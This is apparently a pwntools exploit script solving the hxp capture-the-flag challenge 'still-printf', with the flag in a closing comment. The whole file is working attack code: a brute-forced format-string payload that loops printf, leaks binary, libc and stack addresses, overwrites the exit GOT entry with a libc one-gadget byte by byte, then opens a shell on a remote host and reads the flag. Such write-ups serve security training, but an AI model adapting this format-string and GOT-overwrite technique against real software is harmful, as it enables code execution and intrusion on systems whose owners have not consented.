#-*- coding: future_fstrings -*-
from pwn import *

binary = ELF('./still-printf')
libc = ELF('./libc-2.28.so')

tries = 0
while True:
    tries += 1
    log.info('Try 0x{:04x}'.format(tries))
    # gacha 0x0068 (prob 1/0x2000)
    payload  = '%c'*13
    payload += f'%{0x0068-13}c' + '%hn'
    payload += f'%{0xdd-0x0068}c' + '%41$hhn\n'

    assert len(payload) < 48

    p = remote('168.119.161.224', 9509)

    p.send(payload)
    try:
        p.recv(0xdd)
        assert p.recv(1) == '\n'
    except (EOFError, AssertionError):
        p.close()
        continue

    try:
        # liveliness test
        payload  = f'%{0xdd}c' + '%41$hhn' + 'YEET!\n'
        p.send(payload)
        p.recvuntil('YEET!\n')
    except EOFError:
        p.close()
        continue
    except Exception as e:
        p.close()
        print(str(e))
        exit()

    payload  = ''
    payload += '%12$16lx|%13$16lx|%15$16lx|'
    payload += f'%{0xdd-0x11*3}c' + '%41$hhn' + 'YEET!\n'
    p.send(payload)

    init, lsm_ret, argv = (int(x, 16) for x in p.recvuntil('YEET!\n').split('|')[:-1])

    binary.address = init - 0x1200
    libc.address = lsm_ret - libc.libc_start_main_return
    buffer = argv - 0x118

    log.success(f'binary: {hex(binary.address)}')
    log.success(f'libc:   {hex(libc.address)}')
    log.success(f'buffer: {hex(buffer)}')

    if '\n' in ''.join(p64(x) for x in [binary.address, libc.address, buffer]):
        log.warning('newline in addresses, retrying...')
        p.close()
        continue

    break

def load_addr(val):
    assert '\n' not in p64(val) and '%' not in p64(val)
    
    payload  = ''
    payload += f'%{0xdd}c' + '%41$hhn'
    old_len = len(payload)
    payload  = payload.ljust(0x20, 'Z')
    payload += p64(val)
    payload += '\n'
    
    p.send(payload)

    remainders = p64(val).find('\0')
    if remainders == -1:
        remainders = 9
    
    p.recvuntil('Z'*(0x20 - old_len))
    p.recv(remainders)

def write_byte(val):
    payload  = ''
    payload += f'%{0xdd}c' + '%41$hhn'
    payload += f'%{0x100-0xdd + val}c' + '%10$hhn'
    payload += 'YEE\n'
    p.send(payload)
    p.recvuntil('YEE\n')

oneshot = libc.address + 0x448a3

for i in range(6):
    load_addr(binary.got['exit'] + i)
    write_byte((oneshot >> (8 * i)) & 0xff)

for i in range(8):
    payload  = ''
    payload += f'%{0xdd}c' + '%41$hhn'
    payload  = payload.ljust(0x2e - i, 'A') + '\n'
    p.send(payload)
    p.recvline()

p.sendline('YEET!')  # trigger exit

p.sendline('cat /flag_*.txt')

p.interactive()

### hxp{%d_hate_fm%d_Xpl%04u,1,7,175} ###
